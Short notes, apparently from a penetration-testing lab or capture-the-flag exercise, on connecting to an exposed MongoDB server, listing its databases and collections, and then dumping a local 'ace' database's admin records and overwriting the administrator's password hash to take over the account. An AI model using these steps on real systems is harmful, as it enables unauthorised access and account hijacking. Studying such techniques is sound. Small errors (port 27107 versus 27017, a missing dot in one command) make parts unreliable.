1. Default port 27107
2. Connecting to mongodb
```
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz

tar xvf mongosh-2.3.2-linux-x64.tgz

cd mongosh-2.3.2-linux-x64/bin

./mongosh mongodb://{target_IP}:27017
```

3. Navigating the db.
```
show dbs << list databases

use <database name>

show collections << show "columns" of a database

db.<collection name>.find().pretty() << display the information stored in a specific collection.
```

3. Local mongo instance
```
1. mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
OR
db.admin.find()pretty()

To update password field, need to know hashing method (sha-512)

2. mkpasswd -m sha-512 Password1234
-m : method
Password1234 : password i want to set

3. Updating the admins password
db.admin.update({ name: "administrator" }, { $set: { "x_shadow": "$6$HglRe.eUtgOxsO39$NuQgQIl/5LMuq2YwCuCpWkjWmL16EhE35aEBrWF.Po4AuGMLSTrHVDXPibIQzA2.PYQAq9bg7xcbIPXLuaS8S0" } });
```